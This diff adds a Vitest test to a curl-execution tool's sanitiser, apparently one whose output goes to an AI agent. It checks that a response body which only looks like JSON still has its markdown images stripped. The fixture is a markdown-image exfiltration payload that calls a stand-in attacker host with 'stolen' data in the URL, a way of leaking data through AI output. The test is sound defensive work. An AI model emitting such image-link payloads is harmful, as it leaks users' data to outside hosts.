@@ -27,7 +27,7 @@ vi.mock("../security/index.js", async () => {
         ...actual,
         validateUrlAndResolveDns: vi.fn().mockResolvedValue({
             hostname: "example.test",
-            ip: "93.184.216.34",
+            resolvedIp: "93.184.216.34",
             port: 443,
         }),
         checkRateLimits: vi.fn(),
@@ -304,6 +304,23 @@ describe("curl_execute include_headers — degraded paths stay honest", () => {
         }));
 
         expect(result.content[0].text).not.toContain("evil.test");
+    });
+
+    it("still strips a body that only LOOKS like JSON", async () => {
+        // `[![x](...)]` starts with `[`, so a leading-character shape test reads
+        // it as JSON and drops the strip stages. Only a parse can tell a real
+        // JSON document from attacker text wearing a bracket.
+        const payload = "[![x](https://evil.test/?d=stolen)]";
+        mockedExecuteCommand.mockResolvedValue(undeterminedStdout("", payload));
+
+        const result = await executeCurlRequest(params({
+            url: "https://example.test/x",
+            include_metadata: true,
+        }));
+
+        const parsed = JSON.parse(result.content[0].text);
+        expect(parsed.response).not.toContain("evil.test");
+        expect(parsed.response).toContain("[image removed]");
     });
 
     it("does not strip a JSON body when the content type is undetermined", async () => {
